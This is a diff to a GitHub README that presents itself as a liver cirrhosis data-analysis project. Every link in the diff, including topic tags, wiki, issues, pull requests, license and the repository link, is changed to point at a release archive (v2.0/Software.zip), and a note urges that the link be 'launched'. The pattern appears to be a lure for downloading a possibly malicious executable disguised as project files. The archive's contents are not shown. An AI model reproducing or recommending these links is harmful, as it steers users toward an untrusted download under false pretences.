@@ -15,17 +15,17 @@ Liver cirrhosis is a serious medical condition that arises from various factors 
 
 ## Repository Topics 📝
 
-- [Analytics](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Data Science](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Data Visualization](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Data Analysis](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Machine Learning](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Machine Learning Algorithms](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Predictive Analytics](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Predictive Modeling](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Python](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Random Forest Classifier](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
-- [Visualization](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
+- [Analytics](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Data Science](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Data Visualization](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Data Analysis](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Machine Learning](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Machine Learning Algorithms](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Predictive Analytics](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Predictive Modeling](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Python](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Random Forest Classifier](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
+- [Visualization](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
 
 ## Project Outcome 📈
 
@@ -35,15 +35,15 @@ The ultimate goal of this project is to contribute valuable insights to the fiel
 
 To kickstart your exploration of liver cirrhosis analysis, you can access the project files by downloading the repository from the following link:
 
-[![Download Project Files](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip%20Files-blue)](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip)
+[![Download Project Files](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip%20Files-blue)](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip)
 
 *Note: The link needs to be launched to access the project files.*
 
 ## Quick Links 📌
 
-- [Project Wiki](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip): Explore detailed documentation and resources related to the project.
-- [Issues](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip): Check out any open issues or contribute by raising new ones.
-- [Pull Requests](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip): Submit your contributions via pull requests to enhance the project.
+- [Project Wiki](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip): Explore detailed documentation and resources related to the project.
+- [Issues](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip): Check out any open issues or contribute by raising new ones.
+- [Pull Requests](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip): Submit your contributions via pull requests to enhance the project.
 
 ## Support 🌟
 
@@ -59,10 +59,10 @@ Let's embark on this data-driven journey to unravel the mysteries of liver cirrh
 
 ## License ℹ️
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
 *Dedicated to advancing the field of liver cirrhosis research through the power of data science and machine learning.* 🚀🔍
 
-[Visit the Repository](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v1.0/Application.zip) for more details. 🌐
+[Visit the Repository](https://github.com/EversonYT09/Liver_Cirrhosis/releases/download/v2.0/Software.zip) for more details. 🌐
